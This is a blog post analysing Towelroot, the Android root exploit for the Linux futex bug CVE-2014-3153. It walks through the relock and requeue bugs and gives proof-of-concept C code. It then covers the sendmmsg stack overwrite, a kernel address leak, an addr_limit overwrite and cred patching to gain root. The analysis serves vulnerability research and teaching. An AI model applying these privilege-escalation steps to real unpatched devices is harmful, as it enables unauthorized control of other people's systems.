---
layout: post
title:  "Towelroot"
subtitle: "An analysis of Towelroot and the futex vulnerability"
date:   2017-11-23
author: Dany Zatuchna
---

A few years back I did an article series about Towelroot and the futex-vulnerability. Since then the website migrated several times and the articles got butchered.

I've managed to locate the original article sources and recreate them here for posterity.

Enjoy.

## The futex vulnerability

### A brief history
On May 26th, 2014, [comex](https://hackerone.com/comex) reported a potential bug in the Linux kernel futex mechanism. Later, as the bug was verified and logged as [CVE-2014-3153](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3153), [geohot](http://en.wikipedia.org/wiki/George_Hotz) managed to leverage this vulnerability into a full blown privilege-escalation which he packaged as an Android application and dubbed TowelRoot. This TowelRoot essentially allowed one to root devices which up until that time were unrootable, such as the Samsung S5.

### Vulnerability
The vulnerability is based on two logical bugs in the Linux kernel futex mechanism: one which allows releasing a pi-lock from userspace, and another which allows requeuing a lock twice.

For those unfamiliar with futex, futex stands for "Fast Userspace muTEX", and I suggest reading about it in [Wikipedia](http://en.wikipedia.org/wiki/Futex) and [here](http://locklessinc.com/articles/mutex_cv_futex/).

For the purpose of recreating and testing the vulnerability, I had set up an Android emulator. The following section will discuss the setting up a emulator for kernel debugging, if you already know how to do that or are only interested in the analysis, you may skip over to the "Relock bug" section.

Just one thing before starting, I'll be heavily referencing functions (by name) from the kernel, so you should be ready with the source files for the futex (`futex.c`, `futex.h`) and rtmutex (`rtmutex.c`, `rtmutex_common.h`) modules at hand.

### Setting up the environment
Required software:
 * [Android studio](https://developer.android.com/sdk/installing/studio.html). We'll need this for the android emulator and other supporting tools. Since I am using Linux as my setup, I will be picking the Linux package. After downloading the package, unpack it to your `$ANDROID_HOME` directory. You should then add it to your `$PATH` environment variable:
```bash
$ export PATH=${PATH}:${ANDROID_HOME}/android-studio/sdk/tools
$ export LD_LIBRARY_PATH=${ANDROID_HOME}/android-studio/sdk/tools/lib
```
 * [Git scm](http://git-scm.com/downloads). Android's sources are hosted in a git repository.
 * Cross-compilation toolchain:
```bash
$ cd $ANDROID_HOME
$ git clone https://android.googlesource.com/platform/prebuilt
$ export PATH=${PATH}:${ANDROID_HOME}/prebuilt/linux-x86/toolchain/arm-eabi-4.4.3/bin
```

### Compiling the Android kernel
The official guide to compiling the Android kernel is [https://source.android.com/source/building-kernels.html](https://source.android.com/source/building-kernels.html), the following is based on that guide with some minor modifications:
 - First, fetch a copy of the goldfish kernel source (according to the guide this is the kernel suitable for emulated environments):
```bash
$ cd $ANDROID_HOME
$ git clone https://android.googlesource.com/kernel/goldfish.git
```
 - We will be interested in version 3.4 of the kernel:
```bash
$ cd ${ANDROID_HOME}/goldfish
$ git checkout -t origin/android-goldfish-3.4 -b goldfish 3.4
```
 - And we also want to undo the fixes applied to the futex module. A quick glance at the history of [`kernel/futex.c`](https://android.googlesource.com/kernel/goldfish.git/+log/android-goldfish-3.4/kernel/futex.c) will reveal that the last revision before the fixes following [CVE-2014-3153](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3153) is e8c92d268b8b8feb550ca8d24a92c1c98ed65ace:
```bash
$ cd ${ANDROID_HOME}/goldfish
$ git checkout e8c92d268b8b8feb550ca8d24a92c1c98ed65ace kernel/futex.c
```
 - We are now ready to start compiling the kernel. First we need to generate the build configuration:
```bash
$ cd ${ANDROID_HOME}/goldfish
$ make ARCH=arm SUBARCH=arm goldfish_armv7_defconfig
```
 - Before we continue, we want to enable debug symbols. In `${ANDROID_HOME}/.config`, set `CONFIG_DEBUG_INFO` parameter to `y`.
 - And we're ready to `make`:
```bash
$ cd ${ANDROID_HOME}/goldfish
$ make ARCH=arm SUBARCH=arm CROSS_COMPILE=${ANDROID_HOME}/prebuilt/linux-x86/toolchain/arm-eabi-4.4.3/bin/arm-eabi-
...
Compile the kernel with debug info (DEBUG_INFO) [Y/n/?] y
  Reduce debugging information (DEBUG_INFO_REDUCED) [N/y/?] (NEW) N
...
```

### Running  the emulator
First we need to set up a machine:
```bash
$ android create avd --name debug --target android-19
Auto-selecting single ABI armeabi-v7a
Android 4.4.2 is a basic Android platform.
Do you wish to create a custom hardware profile [no]
Created AVD 'debug' based on Android 4.4.2, ARM (armeabi-v7a) processor,
with the following hardware config:
hw.lcd.density=240
hw.ramSize=512
vm.heapSize=48
```
And we're ready to run:
```bash
emulator-arm -verbose -debug init -show-kernel -kernel arch/arm/boot/zImage -avd debug -no-boot-anim -no-skin -no-audio -no-window -qemu -gdb tcp::1234
```
Here's a breakdown of all the switches:
```bash
$ emulator-arm                     \
>     -verbose                     \
>     -debug init                  \ # Enable debug messages
>     -show-kernel                 \ # Show kernel messages
>     -kernel arch/arm/boot/zImage \ # Path to the image of the kernel we just compiled
>     -avd debug                   \ # Use the android device setup named "debug"
>     -no-boot-anim                \ # We don't want-
>     -no-skin                     \ # the emulated machine-
>     -no-audio                    \ # to have any sort-
>     -no-window                   \ # of GUI
>     -qemu -gdb tcp::1234           # Notify qemu to set up a gdbserver on localhost:1234
```
We can now fire up gdb from another terminal, and attach to the gdbserver:
```bash
$ cd ${ANDROID_HOME}/goldfish
$ gdb vmlinux
...
Reading symbols from vmlinux...done.
(gdb) target remote :1234
Remote debugging using :1234
warning: Architecture rejected target-supplied description
0xc000dcc4 in sys_call_table () at arch/arm/kernel/entry-common.S:494
494             b       ret_slow_syscall
(gdb)
```
And we're ready to start working.
## The futex vulnerability
### Relock bug
The core of `futex_lock_pi` is `futex_lock_pi_atomic` which attempts to acquire the lock at `uaddr` by an atomic `cmpxchg` of the contents of `uaddr` and the `tid` of the calling thread. Basically this (roughly) translates to:
```c
if (*uaddr == 0) {
    *uaddr = tid; /* Lock acquired */
}
```
If the lock was acquired, the system call returns and the thread holds the lock. If not, then the system call blocks and waits for the lock to be released:
```c
static int futex_lock_pi_atomic(u32 __user *uaddr, struct futex_hash_bucket *hb,
                union futex_key *key,
                struct futex_pi_state **ps,
                struct task_struct *task, int set_waiters)
{
...
    /* Attempt a cmpxchg */
    if (unlikely(cmpxchg_futex_value_locked(&curval, uaddr, 0, newval)))
        return -EFAULT;
...
    /* Check that the cmpxchg succeeded in a 0->TID transition */
    if (unlikely(!curval))
        return 1;
...
}
```
The interesting point about the lock acquisition is that the only requisite is that the `cmpxchg` succeeds, which is completely unrelated to the acquisition state of the futex key related to that address. This means that a futex lock can be released by simply loading the lock's (userspace) address with `0`.

This is more readily understood with an example. Consider the following test program (apologies in advance for the excessive verbosity):
```c
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
  
#include "futaux.h"
  
int mutex = 0;
  
void *thread(void *arg)
{
    int ret = 0;
    pid_t tid = gettid();
    printf("Entering thread[%d]\n", tid);
    ret = futex_lock_pi(&mutex);
    if (ret) {
        perror("Thread could not aqcuire lock\n");
        goto Wait_forever;
    }
    printf("Mutex acquired (mutex = %d)\n", mutex);
Wait_forever:
    printf("Exiting thread[%d]\n", tid);
    while (1) {
        sleep(1);
    }
}
  
int main(int argc, char *argv[])
{
    pthread_t t;
    printf("pid = %d\n", getpid());
    printf("mutex = %d\n", mutex);
    printf("Acquiring lock\n");
    if (futex_lock_pi(&mutex)) {
        perror("Lock error");
        return -1;
    }
    printf("Mutex acquired (mutex = %d)\n", mutex);
    if (argc > 1) {
        printf("Releasing lock\n");
        mutex = 0;
        printf("mutex = %d\n", mutex);
    }
    if (pthread_create(&t, NULL, thread, NULL)) {
        perror("Could not create thread");
        return -1;
    }
    while (1) {
        sleep(1);
    }
    return 0;
}
```
The output when running this on the emulator is:
```bash
$ adb shell /data/relock
pid = 394
mutex = 0
Acquiring lock
Mutex acquired (mutex = 394)
Entering thread[396]
^C
```
Now the same execution but with a manual release of the lock after it is acquired, and before the thread is spawned:
```
$ adb shell /data/relock a
pid = 453
mutex = 0
Acquiring lock
Mutex acquired (mutex = 453)
Releasing lock
mutex = 0
Entering thread[459]
Mutex acquired (mutex = 459)
Exiting thread[459]
^C
```
I'd like to add just a few words about why this is a bug. The entire purpose of the futex module is to manage lock/release/contention of locks on behalf of the user. The `cmpxchg` is performed as a sort of optimization in order to grab a lock quickly (a.k.a. fast-path), however this does not absolve the kernel from managing the internal state of the lock. You may examine the fix for this bug by yourself to better understand what I meant.
### Requeue bug
The syscall `futex_wait_requeue_pi` basically means "Take the lock `uaddr1` and wait for `uaddr2` to be available, once it is, take it and release `uaddr1`".

This call must be paired with `futex_requeue`. While `futex_wait_requeue_pi` just sets up the queued waiter, `futex_requeue` does the heavy lifting and adds that waiter to various waiting lists and takes care of waking it up.

For example, a normal usage would be:
```c
/* Locks */
int lock1 = 0, lock2 = 0;
  
void thread_a(void *arg)
{
...
    int ret = futex_wait_requeue_pi(&lock1, &lock2);
    /* The system call will now block and waits for some other thread to acquire
    lock2 on its behalf and wake it up */
...
}
  
void thread_b(void *arg)
{
...
    int ret = futex_requeue(&lock1, &lock2, lock1);
    /* The kernel will now try to acquire lock2 for thread_a. On success, it will
    wake up the kernel thread, while on failure it will add a waiter object to a
    list of waiters waiting on lock2, and let the rtmutex module handle the wakeup */
...
}
```
From the above description, it's clear that each `futex_wait_requeue_pi` is paired with a single `futex_requeue` call, and there are measures implemented to prevent further calls with the same parameters.

To be more precise, if we call `futex_wait_requeue_pi(&lock1, &lock2)` and then `futex_requeue(&lock1, &lock2, lock1)`, we can not call another `futex_requeue(&lock1, &lock2, lock1)` as it will return an error.

However, if we were to follow the first `requeue` with a `futex_requeue(&lock2, &lock2, lock2)` the code will not kick us out of the system call.

### Combining the bugs
It's important to understand that there are two ways a sleeping `futex_wait_requeue_pi` can be woken, and both are (apparently) mutually exclusive:

1. The lock was acquired during `futex_proxy_trylock_atomic`, in which case the sleeper is awoken and `futex_requeue` will return.

   End of story.

2. The lock was acquired at the bottom of the `futex_requeue` (during the foreach clause) by `rt_mutex_start_proxy_lock`.

   Again, end of story. By the way, if `rt_mutex_start_proxy_lock` failed to acquire the lock immediately, it will just add a waiter to the list.

However, I must (and did) emphasize the "apparently" in the previous sentence. Because as it turns out, both *relock* and *requeue* bug allow us to both add a waiter, and wake up the sleeping kernel thread (while the waiter is still in the list).

Consider the following usage which takes advantage of both bugs:

![Both futex bugs combined](/assets/futex-vulnerability-timeline.png)

1. (thread-1) `futex_lock_pi(&B)`

   This will make thread-1 acquire `B`, so that the next line will block

2. (thread-2) `futex_wait_requeue_pi(&A, &B)`

   Since `B` is owned (by thread-1), this call will set up the `futex_q` object with a pointer to a temporary `rt_waiter` object on the kernel's stack ([Chekhov's gun](https://en.wikipedia.org/wiki/Chekhov%27s_gun)).

3. (thread-1) `futex_requeue(&A, &B)`

   This will try to acquire `B` on behalf of thread-1, fail, and proceed to add the `rt_waiter` object in the futex_q object associated with the requeue to list of waiters on `B`.

   This is a rough outline of the code flow `futex_requeue`:
   ```c
   static int futex_requeue(u32 __user *uaddr1, unsigned int flags,
                u32 __user *uaddr2, int nr_wake, int nr_requeue,
                u32 *cmpval, int requeue_pi)
   {
   ...
       if (requeue_pi && (task_count - nr_wake < nr_requeue)) {
           /* Branch taken */
           ret = futex_proxy_trylock_atomic(uaddr2, hb1, hb2, &key1,
                   &key2, &pi_state, nr_requeue);
           /* The call will return 0 (the lock is occupied) */
   ...
           switch (ret) {
           case 0:
               /* End of this clause */
               break;
   ...
           }
       }
    
       head1 = &hb1->chain;
       plist_for_each_entry_safe(this, next, head1, list) {
   ...
           /* requeue_pi == 1 */
           if (requeue_pi) {
               atomic_inc(&pi_state->refcount);
               this->pi_state = pi_state;
               ret = rt_mutex_start_proxy_lock(&pi_state->pi_mutex,
                               this->rt_waiter,
                               this->task, 1);
               /* This call will return 0, as the lock was not taken
                * so rt_waiter in futex_wait_requeue_pi's stack frame
                * has been added to the list of waiters on the lock */
   ...
           }
   ...
       }
   ...
   }
   ```

4. (thread-1) set `B` to `0`

   Release `B` (*relock* bug)

5. (thread-1) `futex_requeue(&B, &B)`

   The *requeue* bug here allows us to issue this call, and survive long enough in the system call to reach `futex_proxy_trylock_atomic`, which will, again, attempt to acquire `B` for thread-1. This time, the call will succeed, as the lock is **apparently** free, and so the next time this that happens the kernel thread of thread-2 is woken.

   This time, the flow through `futex_requeue` is:
   ```c
   static int futex_requeue(u32 __user *uaddr1, unsigned int flags,
                u32 __user *uaddr2, int nr_wake, int nr_requeue,
                u32 *cmpval, int requeue_pi)
   {
   ...
       if (requeue_pi && (task_count - nr_wake < nr_requeue)) {
           /* Branch taken */
           ret = futex_proxy_trylock_atomic(uaddr2, hb1, hb2, &key1,
                   &key2, &pi_state, nr_requeue);
           /* The call will return 1 (the lock is free), and as a side
            * effect, the sleeping thread has been woken up */
   ...
           switch (ret) {
   ...
           case default:
               goto out_unlock:
   ...
           }
       }
   out_unlock:
   ...
   }
   ```

6. (thread-2) When the kernel thread is woken up, it checks the reason for the wake up, and then performs the appropriate clean up.

   However, because the normal flow was interfered, upon waking up, the execution flow is:

   ```c
   static inline
   void requeue_pi_wake_futex(struct futex_q *q, union futex_key *key,
                  struct futex_hash_bucket *hb)
   {
   ...
       q->rt_waiter = NULL;
   ...
       wake_up_state(q->task, TASK_NORMAL);
   }

   static int futex_wait_requeue_pi(u32 __user *uaddr, unsigned int flags,
                    u32 val, ktime_t *abs_time, u32 bitset,
                    u32 __user *uaddr2)
   {
       struct rt_mutex_waiter rt_waiter;
   ...
       q.rt_waiter = &rt_waiter;
   ...
       /* This is where the kernel thread goes to sleep */
       ret = handle_early_requeue_pi_wakeup(hb, &q, &key2, to);
   ...
       /* When the thread is woken up via requeue_pi_wake_futex,
        * q->rt_waiter is NULL, so the following branch is taken */
       if (!q.rt_waiter) {
   ...
       } else {
   ...
           /* This is the branch NOT TAKEN, which would normally remove
            * rt_waiter from the waiter list */
           ret = rt_mutex_finish_proxy_lock(pi_mutex, to, &rt_waiter, 1);
   ...
       }
   ...
   }
   ```

The side effect of all of this is that an `rt_waiter` object which resides in the stack of `futex_wait_requeue_pi` has been added to some linked list (`rt_mutex_start_proxy_lock` in `futex_requeue`), and `futex_wait_requeue_pi` has returned without removing that waiter (`rt_mutex_finish_proxy_lock`).

We now have a linked list, where one of the nodes resides on the stack, but outside a stack-frame. Any system call executed following `futex_wait_requeue_pi` will overrun that node, corrupting the list.

However, if we set up the correct system call, with the correct values to run after `futex_wait_requeue_pi` returns, we can control that list to our advantage.

Here is an implementation of the bug combination:
```c
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
  
#include "futaux.h"
#include "userlock.h"
  
int A = 0, B = 0;
  
volatile int invoke_futex_wait_requeue_pi = 0;
volatile pid_t thread_tid = -1;
  
void *thread(void *arg)
{
    thread_tid = gettid();
    printf("[2]\n");
    userlock_wait(&invoke_futex_wait_requeue_pi);
    futex_wait_requeue_pi(&A, &B);
    printf("Someone woke me up\n");
    while (1) {
        sleep(1);
    }
}
  
int main(int argc, char *argv[])
{
    pthread_t t;
    int context_switch_count = 0;
  
    printf("[1]\n");
  
    futex_lock_pi(&B);
  
    userlock_lock(&invoke_futex_wait_requeue_pi);
    pthread_create(&t, NULL, thread, NULL);
    /* Wait for the thread to be in a system call */
    while (thread_tid < 0) {
        usleep(10);
    }
    context_switch_count = get_voluntary_ctxt_switches(thread_tid);
    userlock_release(&invoke_futex_wait_requeue_pi);
    wait_for_thread_to_wait_in_kernel(thread_tid, context_switch_count);
  
    printf("[3]\n");
    futex_requeue_pi(&A, &B, A);
  
    printf("[4]\n");
    B = 0;
  
    printf("[5]\n");
    futex_requeue_pi(&B, &B, B);
  
    while (1) {
        sleep(1);
    }
    return 0;
}
```

Notice I've added infinite sleeps in the end of all the threads. Their purpose is apparent as soon as we terminate the program. From the shell which runs the emulator, we can see we caused a kernel panic:
```
kernel BUG at kernel/rtmutex_common.h:74!
Internal error: Oops - BUG: 0 [#1] PREEMPT ARM
CPU: 0    Not tainted  (3.4.67-gd3ffcc7-dirty #8)
PC is at rt_mutex_slowunlock+0x54/0x130
LR is at rt_mutex_slowunlock+0x40/0x130
pc : [<c037bec0>]    lr : [<c037beac>]    psr: 20000093
sp : de2cdde0  ip : 00000017  fp : 00000001
r10: de0d3620  r9 : 00000014  r8 : de2b7b9c
r7 : de258608  r6 : de2cde40  r5 : 20000013  r4 : de2cc000
r3 : de2cc000  r2 : 00000002  r1 : 00000000  r0 : de2cde4c
Flags: nzCv  IRQs off  FIQs on  Mode SVC_32  ISA ARM  Segment user
Control: 10c53c7d  Table: 1e2c8059  DAC: 00000015
....
```

Examining the code:
```c
/* rtmutex_common.h */
static inline struct rt_mutex_waiter *
rt_mutex_top_waiter(struct rt_mutex *lock)
{
    struct rt_mutex_waiter *w;
    w = plist_first_entry(&lock->wait_list, struct rt_mutex_waiter,
                   list_entry);
     /* The kernel fails on the following assertion, generating an
      * illegal instruction which causes a kernel panic */
    BUG_ON(w->lock != lock);
    return w;
}
  
/* rtmutex.c */
static void __sched
rt_mutex_slowunlock(struct rt_mutex *lock)
{
...
    wakeup_next_waiter(lock);
...
}
  
static void wakeup_next_waiter(struct rt_mutex *lock)
{
    struct rt_mutex_waiter *waiter;
...
    waiter = rt_mutex_top_waiter(lock);
...
}
```

We can see what happens here, when the process was terminated (and with it the threads), the kernel went and tried to release all the locks, and woke up the waiters which contended on them. However, the lock has a waiter in its list, but the waiter object is on a thread stack which must have been cleared or re-appropriated, and so, clearly, the waiter's lock object does not match the lock to which the dangling waiter belongs.

## Escalating the vulnerability(ies)

### Doubly-Linked List

I will assume you are familiar with the concept of linked lists, if not, I suggest reading [the Wikipedia entry](https://en.wikipedia.org/wiki/Linked_list).

Now, the way linked lists are implemented in the kernel are somewhat unique. Usually, you'd find nodes where the next and prev pointers are an equal member of the node as the data it contains. Instead, in the Linux kernel, `include/linux/list.h` defines a `list_head` structure, which is to be embedded into various data structures and serves as a dynamic chain link. This way, a certain data structure can act as a node in several linked lists.

The definition of `list_head` is quite simple (as found in `include/linux/types.h`):
```c
struct list_head {
    struct list_head *next, *prev;
};
```

![double linked list](/assets/double-linked-list.png)

Just one more thing about this specific implementation of linked lists (i.e. in the kernel) is that they are always circular. A node is initialized to point to itself (both `next` and `prev` pointers), and inserting/removing nodes does not break the circle.

### Priority List

Priority lists are slightly more complicated creatures. The idea is to allow each node to have a numeric priority assigned to it, and that inserting/removing items will always leave it ordered (from low to high priority).

Just like in linked lists, `list_head` is a structure one can embed in data nodes, so too, can `plist_node` be embedded in data nodes to specify their membership in priority-lists. The definition of `plist_node` is (taken from `include/linux/plist.h`):
```c
struct plist_node {
    int prio;
    struct list_head prio_list;
    struct list_head node_list;
};
```

Another thing is that plists are always accessed via a head node which is just a `list_head` which points to the first `node_list` node:
```c
struct plist_head {
    struct list_head node_list;
};
```

As you can see, essentially, priority-lists specify two linked-lists. This requires some explanation.

I'll begin with `node_list`, this is just a linked list of all the nodes in the list, sorted by priority. On the other hand, `prio_list` contains only one node of each priority, again, sorted by priority.

Take for example the following list:

![priority list](/assets/priority-list.png)

There are two possible cases of inserting a new node to the plist:

1. There is no node with the same priority in the list
2. here is already a node of the same priority in the list

Same goes for removing a node:

1. There are additional nodes with the same priority
2. The node removed is the last with its priority

Now that's we've got that cleared out of the way, let's review what the futex bug and what it gives us.

In the kernel, when a futex lock is contended, the lock object (an `rt_mutex`) has a priority list of `rt_mutex_waiter` associated with it:
```c
struct rt_mutex {
    raw_spinlock_t wait_lock;
    struct plist_head wait_list; /* The "head" of a priority list of rt_mutex_waiter objects */
    struct task_struct *owned;
};
  
struct rt_mutex_waiter {
    struct plist_node list_entry; /* This is the node which is the part of rt_mutex's wait_list */
    struct plist_node pi_list_entry;
    struct task_struct *task;
    struct rt_mutex *lock;
};
```

Now if you recall, when we call `futex_requeue` the first time, it adds the `rt_waiter`, which resides in the stack frame of `futex_wait_requeue_pi` to the `wait_list` of the lock `B`:
```c
/* kernel/futex.c */
static int futex_requeue(u32 __user *uaddr1, unsigned int flags,
             u32 __user *uaddr2, int nr_wake, int nr_requeue,
             u32 *cmpval, int requeue_pi)
{
...
            ret = rt_mutex_start_proxy_lock(&pi_state->pi_mutex,
                            this->rt_waiter,
                            this->task, 1);
...
}
  
/* kernel/rtmutex.c */
int rt_mutex_start_proxy_lock(struct rt_mutex *lock,
                  struct rt_mutex_waiter *waiter,
                  struct task_struct *task, int detect_deadlock)
{
...
    ret = task_blocks_on_rt_mutex(lock, waiter, task, detect_deadlock);
...
}
  
static int task_blocks_on_rt_mutex(struct rt_mutex *lock,
                   struct rt_mutex_waiter *waiter,
                   struct task_struct *task,
                   int detect_deadlock)
{
...
    plist_add(&waiter->list_entry, &lock->wait_list);
...
}
```

When we call `futex_requeue` the second time, we cause `futex_wait_requeue_pi` to return without removing `rt_waiter` from the list.

In essence, the waiter list will look like this:

![bugged rt_waiter list](/assets/rt_waiter-bugged.png)

Then, if we invoke another system call in the same threads as `futex_wait_requeue_pi`, such that:

1. The system call has a stack frame which overlaps that of `futex_wait_requeue_pi`
2. We can control the contents of that stack frame from user space

Then we can make the waiter list look like this:

![bugged rt_waiter list with overwritten rt_waiter object](/assets/rt_waiter-overwritten.png)

Notice how in the last diagram the pointer arrows to the bugged waiter are no longer bi-directional. There are nodes in the waiter list which point to the bugged waiter's node, but it points to some other place.

### Info Leak

Here is when this starts getting interesting (and also where my insistence on explaining how priority lists becomes apparent). Insertion in a priority-list works by scanning the list (starting from `plist_head`), until a node with a priority larger than the inserted node's is encountered. Then, the node is inserted before that node:
```c
void plist_add(struct plist_node *node, struct plist_head *head)
{
...
ins_node:
    list_add_tail(&node->node_list, node_next);
...
}
```

The reason this is useful is that `list_add_tail` adds a node between itself, and its prev node. In our case, the bugged node's next can be set to point to an arbitrary memory address.

You can probably see where it's going. We can force next to point to some memory which is shared to user and kernel, where we crafted our own node and it's preceding node.

![bugged rt_waiter set-up to point to bogus rt_waiter nodes](/assets/rt_waiter-crafted.png)

After adding a new waiter to the list via `futex_lock_pi` from a thread with a controlled priority, we can make it add itself before the fake node, so the list will look like this.

![bugged rt_waiter after making the kernel add a new waiter](/assets/rt_waiter-crafted-after-add.png)

Lo and behold, we have an object in the kernel whose address is visible from user space!

The method by which we overwrite the bugged `rt_waiter` is invoking a blocking system call immediately following the return of `futex_wait_requeue_pi` to user space. What we require of this system call is:

1. It is deep enough in the stack to override the interesting parts of `rt_waiter`
2. We can control the data in the stack frame of that system call

As luck may have it, there are several such system calls. The ones used in TowelRoot are: `sendmsg`, `sendmmsg`, `recvmsg`, `recvmmsg`. We'll pick `sendmmsg`.

The invocation of `sendmmsg` and associated structures are as follows:
```c
int sendmmsg(int sockfd, struct mmsghdr *msgvec, unsigned int vlen,
             unsigned int flags);
  
struct mmsghdr {
    struct msghdr msg_hdr;
    unsigned int msg_len;
};
  
struct msghdr {
    void *msg_name;
    socklen_t msg_namelen;
    struct iovec *msg_iov;
    size_t msg_iovlen;
    void *msg_control;
    size_t msg_controllen;
    int msg_flags;
};
  
struct iovec {
    void *iov_base;
    __kernel_size_t iov_len;
};
```

Playing a bit with gdb, we can see that in the stack frame of `___sys_sendmsg`, the address range of the dangling `rt_mutex` overlaps with both `iovstack` and `address` like this (I cut away the uninteresting parts):

![`___sys_sendmsg` stack picture](/assets/iovec-vs-rt_waiter.png)

Now, `address` is copied from the buffer supplied in `msgvec.msg_name`, while `iovstack` is copied from `msgvec.msg_iov`. This means our setup ought to look like this:
```c
/* Assume that:
 * 1. The socket (sock) has already been set up and connected.
 * 2. fake_waiter is a pointer to shared memory.
 */
  
int i = 0;
struct mmsghdr msgvec[1];
struct iovec msg_iov[8];
char databuf[128];
  
struct rt_mutex_waiter *k_waiter;
  
memset(databuf, 0, sizeof(databuf));
  
/* Load up msg_iov with legal values */
for (i = 0; i < __count_of(msg_iov); ++i) {
    /* The address loaded to iov_base should be of a mapped memory
     * area, otherwise the kernel will freak out over it */
    msg_iov[i].iov_base = (void *)&fake_waiter;
    msg_iov[i].iov_len = 0x10;
}
  
/* The top 8 bytes of address overlap with rt_waiter.list_entry.prio and
 * rt_waiter.list_entry.prio_list.next */
k_waiter = (struct rt_mutex_waiter *)(databuf + sizeof(databuf) - 8);
k_waiter->list_entry.prio = 120 + 12; /* Preserve the node's priority */
k_waiter->list_entry.prio_list.next = &fake_waiter->list_entry.prio_list;
  
/* Now we set up the structure that gets passed to sendmmsg */
msgvec[0].msg_hdr.msg_name = databuf;
msgvec[0].msg_hdr.msg_namelen = sizeof(databuf);
msgvec[0].msg_hdr.msg_iov = msg_iov;
msgvec[0].msg_hdr.msg_iovlen = __count_of(msg_iov);
msgvec[0].msg_hdr.msg_control = NULL;
msgvec[0].msg_hdr.msg_controllen = 0;
msgvec[0].msg_hdr.msg_flags = 0;
msgvec[0].msg_len = 0;
  
sendmmsg(sock, msgvec, __count_of(msgvec), 0);
```

### Kernel Write

Using the same trick, we can override the bugged waiter objects with addresses in the kernel (now that we have an anchor address it's relatively easy to pinpoint specific data in the kernel), and trigger another insertion.

This time, instead of writing a to shared memory, we tricked the kernel into writing to kernel memory.

Now that we've covered how the futex bugs can be escalated to kernel read/write (though with limited functionality), we can start thinking how to use these building blocks in order to achieve arbitrary read/write to the kernel, and ultimately gaining root access.

## Pwning the kernel && root

### A Quick Recap

I'll just quickly review what we have so far. Using the futex bug, we created a scenario where the waiter list associated with a certain lock contains dangling references to the thread which called `futex_wait_requeue_pi`.

By calling `sendmmsg` with specific parameters, we were able to make the dangling waiter object point to a fake waiter object in shared memory. The fake waiter points to another fake waiter in shared memory as its previous node.

When we add a new waiter, which is basically spawning a thread and calling `futex_requeue_pi` ,whose priority is greater than the dangling `rt_waiter`, but smaller than the fake waiter's, it gets added between the two fake waiters, exposing the kernel address of the new waiter via the next/prev pointers of the fake waiters.

The process can be encapsulated in the following expression:

```c
*(fake_waiter.prev) = kernel_address_of_added_waiter;
```

Now, while the first time the fake waiter pointed to shared memory, the result was a disclosure of a kernel address, we can use this method to write anywhere in the kernel provided we have a valid address, which we now do.

### Extending the Reach

The form of write we have now is pretty limited for two reasons, first, we can only write, and second, we can only write values which are addresses of `rt_waiter` object.

Not all is lost though. First, let's remember that the address of the waiter is an address in the kernel stack of the thread whose waiter was added to the list. Let's call it the compromised thread for reasons which will be obvious soon enough.

In the kernel, each thread is allocated its own stack, at the bottom of which there's a `thread_info` structure which describes several parameters of the thread. Among which is the `addr_limit`:

```c
struct thread_info {
    long unsigned int flags;
    int preempt_count;
    mm_segment_t addr_limit; /* <<< this one */
    struct task_struct *task;
    struct exec_domain *exec_domain;
    __u32 cpu;
    __u32 cpu_domain;
    struct cpu_context_save cpu_context;
    __u32 syscall;
    __u8 used_cp[16];
    long unsigned int tp_value;
    struct crunch_state crunchstate;
    union fp_state fpstate;
    union vfp_state vfpstate;
    struct restart_block restart_block;
};
```

Every time the kernel handles a user supplied address, it verifies that this address is below `addr_limit`, so that a user can't just `read`/`write` to kernel memory via:

```c
fd = open("/some/file/", O_RDRW);
write(fd, kernel_address, 0x1000);
```

In the emulated kernel, the limit is set to `0xbf000000`.

Now, if we could infer the address of `addr_limit` from the disclosed address we would be able to write to it.

Luckily we can. The kernel allocates the stack aligned to a 8KiB boundary, which means that the base of the stack, and consequently the address of the compromised thread's `thread_info` is at `disclosed_address & (~(8 * 1024 - 1)) = disclosed_address & 0xffffe000`. The `addr_limit` field is just 8 bytes above that address.

Good, then we have an address, which means we can prepare the fake waiter's `prev` to point to it, and when we trigger adding a new waiter to the list, we will override `addr_limit` with an address in the kernel. We still have several problems though:

1. The compromised thread is sleeping. Well that's not a big problem, we can wake it up with a signal.
2. The values with which we override the `addr_limit` might be below the stack frame of the compromised thread, so it doesn't really help us very much.

To solve the second issue, we can perform the following staggered process: on the main thread we'll be spawning new waiter threads, after every spawn, we try to read `addr_limit` in the compromised thread using the write trick. We do that until we manage to sneak in a successful write. Once this happens, i.e. if we can read `addr_limit`, then we can also write to `addr_limit` using the same trick. In order to gain unrestricted read/write, we'd want to write `0xffffffff` to `addr_limit`:

```c
uint32_t max_limit = 0xffffffff;
int pipefd[2];
pipe(pipefd);
write(pipefd[1], &max_limit, sizeof(max_limit));
read(pipefd[0], thread_info.addr_limit, sizeof(max_limit));
```

We can now read and write anywhere in the kernel, but only from the compromised thread.

### Root

If you'll notice, the `thread_info` structure contains a pointer to the task structure. We can now read the address of the structure and the structure itself. There's a particular field which interests us in the task structure:

```c
struct task_struct {
...
    const struct cred *real_cred;
    const struct cred *cred;
...
};
 
struct cred {
    atomic_t usage;
    uid_t uid;
    gid_t gid;
    uid_t suid;
    gid_t sgid;
    uid_t euid;
    gid_t egid;
    uid_t fsuid;
    gid_t fsgid;
...
};
```

The cred structure specifies the process' credentials. If we were to change all the ids to 0, we'll essentially make the process a root process, following which we can do whatever we want in the context of that process.

However just being `*id=0` is not enough, modern linuxes (linuces?) rely on the "capability" system. So we also have to give the process all the possible capabilities:

```c
struct kernel_cap_struct {
    uint32_t cap[2];
};

typedef struct kernel_cap_struct kernel_cap_t;

struct cred {
    atomic_t usage;
    uid_t uid;
...
    kernel_cap_t cap_inheritable;
    kernel_cap_t cap_permitted;
    kernel_cap_t cap_effective;
    kernel_cap_t cap_bset;
...
};
```

Giving the process all capabilities is done by turning on all the bits in each `cap_*` structure.

## Summary

That's it. This is how you go about exploting towelroot on Android.

I've written a demo app to showcase the exploit, and you can find it [here](https://github.com/Appdome/towelroot-omap4-tuna). Just keep two things in mind:
1. This app was tailored to work on Galaxy Nexus with Android 4.3. The differences are in the arrangement of kernel structures and stack depth of various functions. Some reversing work is required to find all those "constants".
2. Excuse me for the horrible design, I'm a researcher, not a UI designer.

   Also, the build system is a bit outdated at the time (a 3yr old project). I hope I'll get around to porting it to gradle.

